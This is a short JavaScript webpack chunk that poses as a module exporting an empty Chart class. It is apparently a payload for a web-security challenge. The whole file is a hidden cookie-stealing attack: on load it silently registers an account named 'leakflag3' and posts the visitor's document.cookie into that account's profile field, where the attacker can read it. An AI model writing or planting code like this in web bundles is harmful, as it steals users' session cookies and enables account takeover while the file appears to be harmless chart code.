(self.webpackChunkprofile_app = self.webpackChunkprofile_app || []).push([[65], {
  6349: (module) => {
    (async () => {
      await fetch("/register", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "username=leakflag3&password=123456&password2=123456"
      });
      await fetch("/profile/update", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "markdown=" + encodeURIComponent(document.cookie)
      });
    })();

    module.exports = class Chart {
      constructor() {}
    };
  }
}]);
